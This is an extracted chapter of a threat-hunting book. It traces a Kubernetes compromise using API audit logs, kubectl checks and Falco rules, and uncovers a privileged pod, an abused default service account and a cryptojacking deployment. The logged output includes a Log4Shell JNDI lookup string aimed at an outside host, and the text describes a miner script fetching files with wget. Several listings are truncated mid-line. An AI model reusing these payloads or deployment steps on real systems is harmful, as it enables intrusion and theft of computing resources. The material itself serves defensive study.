Cluster endpoint running the API server: 35.199.171.183
Cluster pod address range: 10.48.0.0/14
Service address range: 10.52.0.0/20
Note
VPC creates a private cloud-like environment on public clouds by hosting resources such as network services, security services, virtual machines, and Kubernetes clusters. If required, services hosted in a VPC can be exposed to other VPCs or the public.
Note
In Kubernetes, namespaces provide a mechanism for isolating groups of resources within a single cluster. In a cluster, there are three default namespaces: kube-system (for Kubernetes components,) kube-public (for public resources) and default (for user resources.) A new namespace can be created as required.
Listings 5.1 and 5.2 show the details of the cluster using kubectl, the Kubernetes command-line tool that communicates with the Kubernetes cluster's control plane using the Kubernetes API. The tool allows authorized administrators to interact and manage the cluster and Kubernetes objects remotely.
Listing 5.1 Cluster details
kubectl cluster-info                                               
Kubernetes control plane is running at https://35.199.171.183     ...
Listing 5.2 Cluster nodes summary
kubectl get nodes -o wide | awk {'print $1" "$6" "$7'} | column -t  
NAME                                       INTERNAL-IP  EXTERNAL-I gke-production-default-pool-3b82e871-momk  10.138.0.26  34.83.195. gke-production-default-pool-3b82e871-kbk7  10.138.0.29  34.168.161 gke-production-default-pool-3b82e871-tsbx  10.138.0.30  34.168.242
Listing 5.2 shows the internal and external IP addresses of the three nodes that host the Kubernetes cluster.
Note
Traffic from a pod hosted on a node uses the node's IP address when communicating with other pods or systems outside that node.
Application
The cloud-native application web front-end is exposed to the Internet over
TCP/80 and TCP/443, using the cloud provider load-balancing service. The following shows the Kubernetes service.
Listing 5.3 Kubernetes services in a namespace
kubectl get services -n chapter5                                   
NAME     TYPE           CLUSTER-IP     EXTERNAL-IP     PORT(S)    portal   LoadBalancer   10.52.7.211   34.83.61.253   80:32570/TCP,
Events
Based on the research, we found that the following events are collected and stored in the Humio data store:
 Audit logs for calls made to the Kubernetes API server, including get, list, create, and delete requests. For example, requests made using kubectl are logged.
 Operating system logs from the nodes hosting the Kubernetes cluster, and shown in Listing 5.2, are collected by a DaemonSet pod. The nodes run a version of a Linux-based operating system. Events collected include system configuration modifications, user logins, and Secure Shell (SSH) sessions.
 Web access logs from the public Apache2 web server hosting the web front-end application.
 Cloud firewall logs for inbound and outbound connections established to or from the nodes serving the cluster and hosting the pods and services.
Note
kubectl is a command-line tool that allows you to interact with the Kubernetes API server for cluster management purposes. For example, with kubectl, you can provision a deployment, get the status of the pods or retrieve logs for a container in a pod. It is possible to interact with the Kubernetes API server using other tools such as curl.
Note
A DaemonSet is a pod feature used to ensure that a pod is scheduled and running on all selected cluster nodes. This is very useful when deploying background functions such as event collection.
To understand the environment better, you requested the cloud platform management administrator to provide you with the Kubernetes deployment configuration files. These files are written in Yet Another Markup Language (YAML) and used to create or update Kubernetes components such as pods, deployments, services, and roles. Getting the files is taking a long time. Should we wait for them before going on the expedition?
Note
Waiting for these files to arrive should not stop you from starting a threat hunting expedition. Information in these files might or might not provide us with clues.
We should expect to receive the Kubernetes configuration files anytime during the expedition, so let us start the hunt expedition without waiting for them to arrive.
5.1.3 The hunt expedition
We will be using the Kubernetes API server events to search for our first indicator of compromise: successful calls to the Kubernetes API server from unexpected locations. Before doing that, let us review the structure and content of the Kubernetes API server events.
Kubernetes API Server Events
The following is a sample event generated by the Kubernetes API server corresponding to executing the command kubectl get pods executed from a remote host authorized to manage the Kubernetes cluster.
Listing 5.4 Sample Kubernetes API server event
{
  "@timestamp": "2022-03-05T07:29:11.000Z",   "insertId": "931625f0-953d-45e8-abfc-1f5fab04d588",
  "labels": {
    "authorization.k8s.io/decision": "allow",                         "authorization.k8s.io/reason": "access granted by IAM permissi
  },   ...
  "protoPayload": {
    "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
    "authenticationInfo": {
      "principalEmail": "*****@*****"                             
    },
    "authorizationInfo": [
      {
        "granted": true,
        "permission": "io.k8s.core.v1.pods.list",
        "resource": "core/v1/namespaces/chapter5/pods"            
      }
    ],
    "methodName": "io.k8s.core.v1.pods.list",
    "requestMetadata": {
      "callerIp": "193.188.105.36",                                     "callerSuppliedUserAgent": "kubectl/v1.21.4 (darwin/amd64) k
    },
    "resourceName": "core/v1/namespaces/chapter5/pods",           
    "serviceName": "k8s.io"
  },
  "receiveTimestamp": "2022-03-05T07:29:10.454104682Z",
  "resource": {
    "labels": {
      "cluster_name": "production",                               
      "location": "us-west1-a",
      "project_id": "prismatic-rock-335909"
    },
    "type": "k8s_cluster"   }
(This output is edited for brevity.)
Now that we have some idea about the structure of Kubernetes API server events let us search for the first indicator: successful calls to the Kubernetes API server from unexpected locations.
Searching for the first indicator
What do unexpected locations entail? To answer this question, we need first to identify the expected locations, i.e. sources, of API calls. These include:
 Systems used by the cloud platform administrators to carry out their regular system management tasks. In the previous API server event,
193.188.105.36 and 111.65.33.215 are known management source IP addresses.
 Internal cluster addresses used for management, health checks, and metrics collection purposes. In our case, the following are known IP addresses that make regular calls to the Kubernetes API server: 10.138.0.168 (the IP address hosting the Kubernetes scheduler), 127.0.0.1 (IPv4 loopback IP address), and ::1 (IPv6 loopback IP address.)
 The external IP address of the nodes hosting the pods, 34.83.195.160,
34.168.161.133 and 34.168.242.251.
 Cloud provider systems' IP addresses used to collect metrics about the
Kubernetes cluster. In our case, the following are known source IP
addresses that belong to GCP: 108.177.73.0/24, 108.177.67.0/24,
66.249.93.0/24, and 74.125.209.0/24, 66.249.84.0/24.
Let us run a search that looks for API calls from IP addresses other than those in the above list. The search might help us uncover our first set of clue. Running a search on our Humio data store for events generated in the last 24 hours produces the following output.
Listing 5.5 Search Kubernetes API events in the data store
sourcetype="gcp:k8s:api"                                          | callerIp := rename("protoPayload.requestMetadata.callerIp")     
| decision := rename("labels.authorization.k8s.io/decision")      
| callerSuppliedUserAgent := rename(protoPayload.requestMetadata.c | !cidr(callerIp, subnet=["193.188.105.36", "111.65.33.215", "108.
| groupby(field=[callerIp, callerSuppliedUserAgent, decision], fun
| sort(_count, order=desc)                                        
The search generates the following list of events showing requests from public IP addresses associated with different user agents (e.g., callerSuppliedUserAgent and Mozilla/5.0 zgrab/0.x.)
The value of the decision field is forbid in all requests, which indicates that the Kubernetes API server has declined the incoming requests, as it should.
Listing 5.6 Kubernetes API server events search results
"callerIp","callerSuppliedUserAgent","decision","granted","_count"  
"182.253.115.229","Mozilla/5.0 (Windows NT 10.0; Win64; x64) Apple "45.134.144.141","python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0
...
"220.194.70.77","${jndi:ldap://115.28.134.231:1389/Exploit}","forb "192.241.220.158","Mozilla/5.0 zgrab/0.x","forbid","","1" "167.94.138.61","","forbid","","1" ...
(This output is heavily edited for brevity.)
Let us perform the same search, but look for allowed API calls only.
Listing 5.5 Search Kubernetes API events in the data store
sourcetype="gcp:k8s:api"
| callerIp := rename("protoPayload.requestMetadata.callerIp")
| decision := rename("labels.authorization.k8s.io/decision")
| callerSuppliedUserAgent := rename(protoPayload.requestMetadata.c | !cidr(callerIp, subnet=["193.188.105.36", "111.65.33.215", "108.
| decision="allowed"                                              
| groupby(field=[callerIp, callerSuppliedUserAgent, decision], fun
| sort(_count, order=desc)
The search returns no events. Although there are no successful API calls made from outside the cluster, that does not necessarily eliminate the possibility of unauthorized calls made from within the cluster. For that, let us examine successful ones made from pods hosted on the cluster.
Calls made from pods hosted in the cluster to the Kubernetes API Server would leave the cluster and might use the node's local or public IP addresses; example calls leaving node gke-production-default-pool-3b82e871-momk would use 10.138.0.26 or 34.83.195.160, respectively.
Let us search for Kubernetes API calls made from 10.138.0.26 or
34.83.195.160, paying close attention to the user agent and the principal name fields associated with the calls. The principal name field contains the account used to make the API calls.
This search covers the second indicator highlighted earlier in the chapter: successful calls to the Kubernetes API server using unexpected accounts.
Listing 5.7 Search Kubernetes API events for calls made from specific IP addresses
sourcetype="gcp:k8s:api"
| callerIp := rename("protoPayload.requestMetadata.callerIp")
| decision := rename("labels.authorization.k8s.io/decision")
| callerSuppliedUserAgent := rename(protoPayload.requestMetadata.c
| principalEmail := rename(protoPayload.authenticationInfo.princip
| cidr(callerIp, subnet=[ "10.138.0.26", "34.83.195.160"])        
| groupby(field=[callerIp, callerSuppliedUserAgent, decision, prin
| sort(_count, order=desc)
The search returns a large number of events with different principal names and user agents; all using one of the Kubernetes nodes' public IP addresses,
34.83.195.160.
Listing 5.8 Search for specific IP addresses results
"callerIp","callerSuppliedUserAgent","decision","principalEmail","  
"34.83.195.160","cluster-proportional-autoscaler/v0.0.0 (linux/amd
"34.83.195.160","cluster-proportional-autoscaler/v0.0.0 (linux/amd "34.83.195.160","pod_nanny/1.8.13","allow","system:serviceaccount:
"34.83.195.160","metrics-server/v0.0.0 (linux/amd64) kubernetes/$F
"34.83.195.160","kubelet/v1.21.6 (linux/amd64) kubernetes/7ce0f9f"
"34.83.195.160","Prometheus/","allow","system:serviceaccount:kube"34.83.195.160","kubectl/v1.24.2 (linux/amd64) kubernetes/e6c093d kubernetes/e6c093d ","forbid","system:serviceaccount:chapter5:defa
The output shows allowed API calls with system service accounts contained in the principalEmail field:
system:serviceaccount:kube-system:konnectivity-agent-cpha system:serviceaccount:kube-system:kube-dns-autoscaler system:serviceaccount:kube-system:metrics-server system:serviceaccount:kube-system:gke-metrics-agent system:serviceaccount:chapter5:default.
The question that you might have now is: which service account should have access and which should not? The answer to this question is not common information that threat hunters would know. The cloud platform administrator, on the hand, might help you answer the question. If the administrator could not, then you might want to reach out to the public cloud provider (which in our case is Google). Otherwise, you can always search the Kubernetes documents (https://kubernetes.io) for answers.
Threat hunters are curious by nature; let us research the Kubernetes principal name topic to understand who can access what. Our research revealed that all the requests were normal, but the ones from
system:serviceaccount:chapter5:default. chapter5 is the namespace and default is the default service account in that namespace.
According to the Kubernetes service account document
(https://kubernetes.io/docs/tasks/configure-pod-container/configure-serviceaccount), when you create a pod, if you do not specify a service account, it is automatically assigned the default service account in the same namespace.
Note
This default service account does not have permissions associated with it by default.
Finding activities in the log from the default service account leads us to investigate the resources requested and the operations made in these requests. To do this, let us search for all the API requests associated with system:serviceaccount:chapter5:default.
Listing 5.9 Search for default service account activities
sourcetype="gcp:k8s:api"
| decision := rename("labels.authorization.k8s.io/decision")
| callerSuppliedUserAgent := rename(protoPayload.requestMetadata.c
| principalEmail := rename(protoPayload.authenticationInfo.princip
| methodName := rename(protoPayload.methodName)
| message := rename(protoPayload.response.message)
| principalEmail = "system:serviceaccount:chapter5:default"       
| groupby(field=[principalEmail, methodName, decision, callerSuppl
| sort(_count, order=desc)
The search returns the following output, which shows many allowed API calls and a few forbidden ones.
Listing 5.10 Search for default service account activities results
"principalEmail","methodName","decision","callerSuppliedUserAgent"  
"system:serviceaccount:chapter5:default","io.k8s.get","allow","kub
"system:serviceaccount:chapter5:default","io.k8s.core.v1.namespace
"system:serviceaccount:chapter5:default","io.k8s.core.v1.pods.list "system:serviceaccount:chapter5:default","io.k8s.core.v1.services.
"system:serviceaccount:chapter5:default","io.k8s.core.v1.services.
"system:serviceaccount:chapter5:default","io.k8s.core.v1.services.
"system:serviceaccount:chapter5:default","io.k8s.core.v1.namespace
The output shows that the default service in the chapter5 namespace has:
Successfully performed operations using a version of kubectl Failed to create namespaces
WARNING
Using the default service account to make API calls from a container to the Kubernetes API server is a strong indicator of compromise.
To understand the current permissions available for the default account in question, we requested the cloud platform administrator to run the following command against the Kubernetes cluster hosting the application. The command retrieves the permissions associated with the account system:serviceaccount:chapter5:default.
Listing 5.11 Check the permissions of the default service account
kubectl auth can-i --list --as=system:serviceaccount:chapter5:defa The administrator provided the following output for the above command.
Listing 5.12 Default service account permissions
Resources   Non-Resource URLs   Resource Names   Verbs
...
Pods.       [].                 []              [get list watch cr
...
secrets     []                  []              [get list watch cr
...
services    []                  []              [get list watch cr
...
namespaces         []           []              [get list watch]  ...
(This output is heavily edited for brevity.)
The output shows that the default service account, system:serviceaccount:chapter5:default, has been granted permissions beyond the default ones. For example, the service account can perform all the following actions on pod objects: get, list, watch, create, delete, deletecollection, patch, and update. The service account can also list namespaces but cannot create new ones.
The next question that comes to mind is which container those API calls were initiated from?
Finding where the suspicious api calls came from
The requests could have been initiated from one or more containers. Unfortunately, the API server events do not contain information about which container(s) initiated the calls. All the events show the Kubernetes node's external IP address, 34.83.195.160, as the callerIp. This IP address is used for traffic leaving a container hosted on that node towards an IP address outside the cluster, which in this case the Kubernetes API server.
Although the Kubernetes API server events do not help us answer the question, they can provide us with a piece of information that we can use to investigate further: the user agent, kubectl/v1.23.4 (linux/amd64) kubernetes/e6c093d.
Note
The user agent is determined by the caller and can be altered by the client making the API calls. When making requests, an attacker may change the user agent string to reflect a common user agent such as kubectl. There is no guarantee that the client was actually kubectl/v1.23.4.
In the middle of your hunt expedition, we received the Kubernetes YAMLbased configuration files we requested from the cloud platform administrator before starting the hunting expedition (it could have been a few hours now since we started the expeditions). The files describe the deployments in a cluster called production. The configuration files might provide some important information to help us reveal valuable clues, so let us process the information they contain immediately.
Note
Expect to be interrupted while you conduct an expedition. Threat hunters will receive information or requests to provide information while conducting an expedition. The hunter needs to prioritize and select what to process first. Depending on the state and the criticality of the hunt, you might want to continue with your expedition before processing incoming requests.
The portal deployment configuration file in particular, portal.yaml, caught your attention. The specification of the portal deployment, shown below, allows the container to run in privileged mode: privileged is set to true. Such configuration allows the container to have almost unrestricted host access. This configuration by itself does not represent a threat execution as such. However, it is a misconfiguration that could lead to a severe system compromise if an adversary can compromise an application running on the container and gain shell access.
Listing 5.13 Portal deployment configuration YAML file
apiVersion: apps/v1
kind: Deployment                                                  metadata:
  name: portal                                                      namespace: chapter5                                             spec:   selector:     matchLabels:       app: portal
  replicas: 3                                                       template:     metadata:       labels:
        app: portal     spec:       containers:       - name: portal
        image: production/portal                                          ports:
        - containerPort: 80                                               - containerPort: 443                                              securityContext:           privileged: true                                        
By default, containers run in unprivileged mode. This default mode allows them to use the underlying system resources while shielded by the container runtimes from the host system and other containers running on the same system. For example, a container can use the allocated compute, memory, and disk resources without being able to read files on the node or files belonging to other containers.
WARNING
Running a container in privileged mode is dangerous. Attackers gaining access to a privileged container deployed on Kubernetes or having the right level of permissions to create a new privileged container can get access to the host's resources. A privileged container is a container that has been deployed with access to the devices of the host machine, lifting the limitations applied to ordinary containers.
The number of concerning observations is mounting:
 A default account on one pod or more making successful calls to the Kubernetes API server.
 The web front-end is deployed on privileged mode pods.
You immediately requested the cloud platform administrator to run a number of commands on all the pods within the portal deployment in search of potential compromise. The search would be executed against containers running in the namespace chapter5 in search of containers with the kubectl client, used in the API requests seen earlier using the default service account.
HINT
To speed up your hunt work, you might want to consider having an interactive session with the platform administrator, physically or virtually, instead of sending requests and waiting for responses.
Listing 5.14 Search for containers with the kubectl client
kubectl exec -it $pod-name$ -n chapter5 -- find / -name "kubectl"  
1049445 45500 -rwxr-xr-x   1 root     root     46592000 Mar  5 08:
The output shows that a file called kubectl exists under the /tmp directory. When checked, the platform administrator confirmed that kubectl is not part of the original container image deployed. A number of questions arise:
How did the kubectl file arrive in that container?
Was kubectl executed from that container, and if so what command was used to execute it?
Going back to the data sources available for us, we have the node operating system audit logs. These are already collected by an event collection DaemonSet deployed on the cluster. The following shows the pod of type DaemonSet used to collect the node's audit logs.
Listing 5.15 Get pods of type DaemonSet
kubectl get pods -n chapter5 -o custom-columns=NAME:.metadata.name
 
NAME                               CONTROLLER cos-auditd-logging- mxq4k           DaemonSet                     
After researching the content of the nodes' audit logs, we reached a conclusion that they do not include commands locally executed in containers. This is not to undermine the importance of collecting node audit logs. They might prove to be useful later in this expedition or in other future expeditions.
You never know!
Logging commands executed in containers
In order to get visibility on commands executed in containers, we can turn to the Extended Berkeley Packet Filter (eBPF)(https://ebpf.io), a Linux Kernelbased construct that allows extending kernel capabilities without the need to recompile the kernel or load new kernel modules. Remember, the nodes hosting the Kubernetes cluster run Linux. When deployed, eBPF can provide us with visibility into commands executed within the cluster. This helps us answer questions such as what happened, when did it happen, who initiated it, and where did it happen?
NOTE
With eBPF you can record and log commands executed in a kubectl exec session, which you then can forward as events to a data store. You then can play sessions back and know the exact sequence of events that took place.
Unfortunately, when checking with the cloud administrator, we found out that eBPF is not deployed in the cluster, at least not yet.
To start capturing commands executed on containers, we asked the platform administrator to deploy Falco (https://falco.org), an open-source runtime monitoring security tool for containerized deployments that uses eBPF as the underlying construct. Falco allows us to capture and report unexpected executions from containers. After explaining the situation, the platform administrator accepted the request and deployed Falco on the namespace chapter5.
Note
Although hunters can request deploying new event collection and security detection tools, deploying those tools in production systems should be thoroughly evaluated and tested.
After deploying Falco, the following shows the running pods as DaemonSet: cos-auditd-logging-h8f2l collecting node audit logs and falco-5j8zw running Falco.
Listing 5.16 Get pods of type DaemonSet
kubectl get pods -n chapter5 -o custom-columns=NAME:.metadata.name
 
cos-auditd-logging-h8f2l           DaemonSet falco-5j8zw                        DaemonSet.                     
Falco monitors the behavior of the system, based on a ruleset, and alerts on threats detected at runtime. We deployed Falco using the default ruleset published on https://github.com/falcosecurity/falco/blob/master/rules/falco_rules.yaml.
The default ruleset contains the following two rules, written in YAML, that monitor client executions in a container and attempts to contact the K8S API Server from a container.
Listing 5.17 Kubernetes client is executed in a container rule
rule: The docker client is executed in a container                desc: Detect a k8s client tool executed inside a container        condition: spawned_process and container and not user_known_k8s_cl output: "Docker or kubernetes client executed in container (user=% priority: WARNING                                                 tags: [container, mitre_execution]                                
Listing 5.18 Contact Kubernetes API server from container rule
rule: Contact K8S API Server From Container
desc: Detect attempts to contact the K8S API Server from a contain condition: >
evt.type=connect and evt.dir=< and
  (fd.typechar=4 or fd.typechar=6) and   container and   not k8s_containers and   k8s_api_server and
  not user_known_contact_k8s_api_server_activities
output: Unexpected connection to K8s API Server from container (co priority: NOTICE tags: [network, k8s, container, mitre_discovery]
In few hours after deploying Falco, we received the following security events from Falco.
Listing 5.19 Falco event 1
10:51:03.656093989: Warning Docker or kubernetes client executed i
Listing 5.20 Falco event 2
10:51:03.782444747: Notice Unexpected connection to K8s API Server
Listing 5.21 Falco event 3
10:55:29.740206383: Notice Ingress remote file copy tool launched 
Let us go through the Falco security events. There is plenty of interesting information contained in these events.
The first event is a warning message that shows that kubectl was issued from pod portal-5647ffc5d7-bd9pv to create a new deployment using image miningcontainers/xmrig (hosted by default on https://hub.docker.com) on namespace chapter5. miningcontainers/xmrig is an image for a crypto mining container (https://github.com/mining-containers/xmrig.) The token used to make the connection to the API Server is masked --token=***, but we can see the certificate authority certificate used in the connection is pointing to /var/run/secrets/kubernetes.io/serviceaccount/ca.crt.
The second event relates to the first, but it provides us with the source IP Address of the connection, 10.48.3.16, which is the pod's IP address.
The third event shows a file retrieval request using wget to http://84.32.188.69:9999 with parent process xmrig.sh.
We now have evidence that someone or something is executing kubectl from pod portal-5647ffc5d7-bd9pv using credentials stored in
/var/run/secrets/kubernetes.io/serviceaccount/, the default location were the service account credentials and other information are stored in a container. 10.48.3.16 is the IP address of the web portal pod that we have seen earlier running in privileged mode.
/var/run/secrets/kubernetes.io/serviceaccount is a mounted directory that contains the following files by default.
Listing 5.22 Service account directory content
ca.crt                                                            namespace                                                         token                                                             
We established earlier that the default service account does not have permissions associated with it by default. The questions that we need to answer are: who changed the permission of this account, why and when? finding out who changed the service account permissions
In Listing 22 we search for API events containing Kubernetes RoleBinding requests trying to find out who made changes to the default service account. A role binding grants permissions to a user or an account within a specific namespace. We tried to search for events in the last few months to uncover RoleBinding changes that are relevant to the hunting expedition.
Listing 5.23 Search for Kubernetes RoleBinding requests
| sourcetype="gcp:k8s:api"
| decision := rename("labels.authorization.k8s.io/decision")
| callerSuppliedUserAgent := rename(protoPayload.requestMetadata.c
| principalEmail := rename(protoPayload.authenticationInfo.princip
| methodName := rename(protoPayload.methodName)
| message := rename(protoPayload.response.message) | reason := rename("labels.authorization.k8s.io/reason")
| kind :=rename(protoPayload.request.kind)
| name:= rename(protoPayload.request.subjects[0].name)
| kind=RoleBinding AND name=default AND protoPayload.request.subje
| table([@timestamp, principalEmail, name, methodName, decision, m
The search reveals that there are kubectl commands issued by an exadministrator on June at 19:58 Coordinated Universal Time (UTC.)
Listing 5.24 RoleBinding changes for chapter5:default
"timestamp","principalEmail","name","methodName","decision","messa  
"2022-06-26T19:58:05.461528Z", "nadhemj@yahoo.com","default","io.k
"2022-06-26T19:58:45.690892Z", "nadhemj@yahoo.com","default","io.k
Making changes to the default service account permission should be forbidden. Why would an administrator make such changes late in the day?
Could this be an insider-driven or assisted compromise with some unknown motive (e.g., financial, personal, etc.)? Or is it a situation in which the exadministrator's system has been compromised and then used to make changes to the default service account.
To answer the question, let us analyze the sequence of events collected from :
1. Changes to the default service account in the chapter5 namespace, made by the ex-administrator.
2. kubectl commands issued from the pod using the default service account.
The timeline reveals what seems to be a deliverable sequence of change and test events. Changes are made to the default service account followed by kubectl commands issued from the pod. This does not necessarily indict the ex-administrator. It might be the case that an attacker gained concurrent unauthorized access to both the pod and the administrator's system.
With the suspicion of an insider involvement (the ex-administrator), we should reach out to the human resources and legal teams. The incident response manager would typically be the point of contact with these teams to brief them about the findings and consult on future actions or precautions to consider. The legal team would advise you on handling evidence, communicating between teams, and sharing incident information.
Note
The legal aspect of managing the incident is outside the book's scope. However, the hunter should flag the other incident response team and the incident manager, if one exists, items that might require legal advice.
More on crypto mining events
Back to the crypto mining deployment events, we found, let us retrieve the list of pods deployed across all the namespaces.
Listing 5.25 Get pods deployed in all namespaces
kubectl get pods --all-namespaces
NAMESPACE     NAME                                                
...
chapter5      portal-5647ffc5d7-bd9pv                             chapter5      web-front-7984494555-2lwzs                          chapter5      web-front-7984494555-48jv6                          chapter5      web-front-7984494555-54dtq                          chapter5      web-front-7984494555-5mp9l                          chapter5      web-front-7984494555-6sctn                          chapter5      web-front-7984494555-6sds8                          chapter5      web-front-7984494555-72fdn                          chapter5      web-front-7984494555-89p62                          chapter5      web-front-7984494555-9ckws                          chapter5      web-front-7984494555-cmq56                          chapter5      web-front-7984494555-d7psp                          chapter5      web-front-7984494555-dhh96                          ...
(This output is edited for brevity.)
Take a note of pods that start with web-front. These are ones that correspond to the Falco events output in Listing 5.21. This output indicates a cryptojacking operation, which refers to the unauthorized use of computing power to mine cryptocurrencies.
With all the information we have collected, we proved the hypothesis: an attacker escaping a Kubernetes container and gaining unauthorized access to a substantial portion of the Kubernetes environment. It is time to hand over the case to the incident response team to take the investigation further to contain the threat and coordinate with different teams: cloud platform administration, application owner, human resources, and legal.
Although this brings us to the end of the threat hunt expedition, the threat hunter would still be involved to support the investigation and share recommendations that can help prevent, detect, and respond to similar threats in the future.
Let us go through some essential background information about Kubernetes before visiting the threat hunting process.
5.2 Short Introduction to Kubernetes Security
Container orchestration refers to centrally automating tasks related to operating a workload cluster and services. Kubernetes is fast becoming the industry standard in cloud-native container orchestration platform for managing container clusters. Other orchestration tools exist, such as Docker Swarm (https://docs.docker.com/engine/swarm), OpenStack (https://www.openstack.org), and Rancher (https://rancher.com).
Kubernetes creates, manages, and operates an abstraction layer on top of hosts (also called nodes) to make it easy to deploy and operate applications in a microservice architecture with automation. By doing this, Kubernetes and other orchestration tools introduce other security challenges that did not exist in the legacy world built using virtual machines or dedicated bare metal.
Figure 5.4 shows the four Cs in cloud-native security
(https://kubernetes.io/docs/concepts/security/overview), covering cloud, cluster, container, and on-top code. The threat landscape of each layer should be understood and documented, and the appropriate prevention, detection, and response capabilities deployed.
Figure 5.4 Cloud Native Hosting Infrastructure Layers (Cloud, Cluster, Container and Code)

5.2.1 Security Frameworks
A number of frameworks have been published to cover the security of containers and Kubernetes. The most relevant ones are:
 MITRE ATT&CK(r) Containers Matrix
(https://attack.mitre.org/matrices/enterprise/containers)
 Threat matrix for Kubernetes by Microsoft
(https://www.microsoft.com/security/blog/2020/04/02/attack-matrixkubernetes), which adapts the MITRE ATT&CK(r) framework structure.
 Securing Kubernetes by the Center for Internet Security (CIS)
(https://www.cisecurity.org/benchmark/kubernetes)
Another effort to cover the container threat landscape is published on https://www.darkreading.com/threat-intelligence/microsoft-s-kubernetesthreat-matrix-here-s-what-s-missing, which builds on the MITRE ATT&CK(r) Containers Matrix and the Microsoft Threat matrix for Kubernetes.
Threat hunters can refer to the above list of references to understand the security landscape associated with Kubernetes, create hunting plays and execute threat hunt expeditions.
5.2.2 Data Sources
Events collected are used for the purposes of detection and hunting. Events of relevance are categorized as:
 Infrastructure: Events generated by the Kubernetes infrastructure services. For example, access and audit events on the K8s nodes or events generated by a load-balancing service.
Containers: Events generated by workloads hosted on Kubernetes Security controls: Events generated by security tools monitoring the Kubernetes platform and containers.
Collecting events in Kubernetes is different from bare metal servers or virtual machines due mainly to how Kubernetes hosts applications. When an application running on a virtual machine dies, logs generated by that application are still available until you delete them.
In Kubernetes, when pods are evicted, crashed, deleted, or scheduled on a different node, the logs that were saved on the containers are lost. Therefore, it is critical to collect logs of interest and store them centrally.
In general, it is recommended to capture standard output (stdout) and standard error output (stderr) from each container on the node to a log file. Events in the log files are then shipped to a central data store, where they can be accessed later. Infrastructure
Example of relevant infrastructure events for detection and hunting purposes includes the following:
 Events containing information on user agents connecting to the containerized infrastructure (e.g. kubectl version)
 Events of successful and forbidden requests to the Kubernetes API server are performed from within or out of pods. These events could help to detect API enumeration activities.
Events containing information about file mounts on containers
Web requests served by the load balancer service
User access events
Activities performed on critical files and folders Changes made to the logging agent.
In addition, you need to have enough context about the Kubernetes infrastructure by collecting:
Details of clusters
Details on namespaces
Details of pods on all clusters
Status of the logging agent on all clusters
You can also benefit from gaining visibility on inter and intra-cluster connections/flows. One option to consider is to use a Kubernetes service mesh. One of them is Istio, an open-source service mesh that allows you to capture service-to-service communication in a distributed application deployment such as Kubernetes.
Containers
Containers write stdout and stderr, but with no agreed format. A node-level agent collects these logs and forwards them for aggregation. Logs are usually located in the /var/log/containers directory on the nodes. The format and content of these logs would vary depending on the application generating these logs.
Security Controls
Security controls deployed to monitor clusters should provide security visibility and controls within the three phases of the application lifecycle:
build, deploy and run. Relevant controls to apply to the three phases include:
Build (secure supply chain) Image scanning
Binary/artifact scanning
Deploy (secure infrastructure)
Deviation from benchmarks such as CIS
Fixable CVSS
Privilege/RBAC
Segmentation policies
Runtime (secure workloads)
Detection
Response
Forensics
With this background on Kubernetes security, let us go through the threat hunt process we followed in the chapter.
5.3 Threat hunting process
To complete our structured hunt, let us trace the process highlighting the steps we went through.
5.3.1 Preparation
The following are the steps that we took to prepare for the hunt, also shown in Figure 4.8:
1. The trigger for the threat hunt was a threat model exercise for the cloud infrastructure hosting a cloud-native application.
2. Multiple threat scenarios were identified by the threat modeling exercise. The threat hunter selected the one with the highest relevance and impact as the first threat scenario to hunt.
3. The hunter followed the standard hunt play template.
4. The hunter collected information about the public cloud infrastructure, cloud-native applications, and events collected and stored in the main data store.
5. For the hunt, the following data sources were available: audit logs for calls made to the Kubernetes API server, system logs from nodes hosting the Kubernetes cluster, web access logs that the public Apache2 web server generates, and cloud firewall logs for inbound and outbound connections established to or from the nodes hosting the cluster.
6. The threat hunter was able to access the data store and search the events using the data store web interface. The performance of the searches was adequate.
Figure 5.5 Threat Hunting Process - Preparation Phase

The hunter creates the threat hunt play document as part of the process, borrowing information from the threat modeling scenario report.
Threat hunt play
 Title: An attacker escaping a Kubernetes container and gaining unauthorized access to a substantial portion of the Kubernetes environment
Reference Number: Hunt-Play-Kubernetes-01
Background: An attacker escaping a Kubernetes container and gaining unauthorized access to a substantial portion of the Kubernetes environment, including the hosting node(s) and other pods/containers deployed in the Kubernetes cluster. When compromised, the attacker can successfully interact with the Kubernetes API server to harvest the cluster information and provision new resources to operate malicious services such as crypto mining, botnet nodes, or tor exit nodes. Gaining access to the container would typically be possible by the adversary exploiting a public-facing application.
 Hypothesis: We hypothesize that an attacker has successfully escaped a Kubernetes container and has control over the Kubernetes infrastructure.  Scope: The scope of the hunt covers the cloud-native application
infrastructure hosted in public and private clouds Threat Techniques:
Escape to Host, MITRE ATT&CK T1611
Exploitation for Privilege Escalation, MITRE ATT&CK TT1068
Resource Hijacking, MITRE ATT&CK T1496
 Exploit Public-Facing Application, MITRE ATT&CKT T1190 References:
MITRE ATT&CK Escape to Host, T1611
(https://attack.mitre.org/techniques/T1611)
 MITRE ATT&CK Exploitation for Privilege Escalation, T1068
(https://attack.mitre.org/techniques/T1068)
 MITRE ATT&CK Resource Hijacking, T1496
(https://attack.mitre.org/techniques/T1496/)
 MITRE ATT&CK Exploit Public-Facing Application, T1190
(https://attack.mitre.org/techniques/T1190)
Let us move to the next phase, execution.
5.3.2 Execution
The following are the steps that we took to execute the hunt, also shown in Figure 4.9:
1. We started by looking for the indicators identified in the threat hunt play.
2. Based on the evidence collected, we proved the hypothesis.
3. During the threat hunt expedition, we continuously updated the security incident case first created by the threat intelligence team.
4. We explored the extent of the threat and uncovered a cryptojacking operation and the possibility of an insider activity. In addition, we requested the cloud platform administrator to deploy new security detection capabilities using Falco.
Figure 5.6 Threat Hunting Process - Execution Phase


5.3.3 Communication
The following are the steps that we took to communicate the hunt finings, as shown in Figure 4.10:
1. After proving the hypothesis and collecting the evidence about the threat execution, we handed over the case to the incident response team to take the investigation further.
2. 2.a The threat hunter shared the following recommendations to enhance the security detection and prevention capabilities:
 3.a Deploy eBPF to gain network and system visibility for your Kubernetes cluster deployments.
 3.a Ensure that you have a process to detect unsafe workload deployments
 3.a Monitor and log calls made to the Kubernetes API server and other API endpoints deployed on your cloud infrastructure and applications.
 3.a Monitor changes made to default service accounts
3. 2.b Based on the information collected during the threat hunt, the threat would share additional TTPs uncovered during the expedition with the threat intelligence team. These would include the following:
 3.b Changes made to the default service account permissions allowing it to retrieve information or make changes that it is not authorized initially to.
4. 2.c Based on the information collected during the threat hunt, the threat hunter found misconfigurations that led to system compromise:
 3.c Workload deployed in privileged mode. Attackers gaining access to a privileged container can access the host's resources.
